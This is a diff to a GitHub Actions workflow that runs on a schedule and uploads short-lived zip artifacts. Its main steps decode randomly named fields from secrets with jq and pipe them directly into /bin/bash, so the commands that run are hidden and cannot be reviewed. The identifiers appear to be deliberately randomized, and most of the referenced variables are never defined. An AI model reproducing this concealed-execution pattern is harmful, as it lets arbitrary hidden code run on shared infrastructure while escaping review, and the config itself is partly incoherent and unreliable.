@@ -1,32 +1,27 @@
 name: richengnongtai
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '48 5/6 * * *'
 
-jobs:  # 2739
+  schedule:
+    - cron: '15 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: richengnongtai
         env:
-          q27477: ${{ secrets.q27477 }}
+          katg31380: ${{ secrets.katg31380 }}
         run: |
-          echo $q27477 | jq -r .bhpbe48455 | /bin/bash
-          echo $ti18 | jq -r .iq5 | /bin/bash
-          echo $hepkq27995 | jq -r .dm5139 | /bin/bash
-          echo $u18 | jq -r .rkaz3265 | /bin/bash
-          echo $pbx0 | jq -r .zspa076 | /bin/bash
-          echo $nux5 | jq -r .r60 | /bin/bash
-          echo $org100 | jq -r .qgn3 | /bin/bash
-          echo $z47 | jq -r .idj416 | /bin/bash
-          echo $i9102 | jq -r .qehxn47 | /bin/bash
-          echo $kobn376 | jq -r .ynp65 | /bin/bash
-          echo $j5856 | jq -r .nfjdn310 | /bin/bash
-          echo $o251 | jq -r .n3 | /bin/bash
-          echo $j2 | jq -r .xxkq456 | /bin/bash
-          echo $rebk95464 | jq -r .ip9 | /bin/bash
-          echo $bgaj407 | jq -r .uzzb06 | /bin/bash
+          printf '%s' "$katg31380" | jq -r .jbth48292 | /bin/bash
+          printf '%s' "$zm40944" | jq -r .ezsm300 | /bin/bash
+          echo $bak84874 | jq -r .bmugf0222 | /bin/bash
+          printf '%s' "$ab66" | jq -r .rekcd213 | /bin/bash
+          echo $x754 | jq -r .ilh2660 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: bqfyIzlW
+          path: "*.zip"
+          retention-days: 1
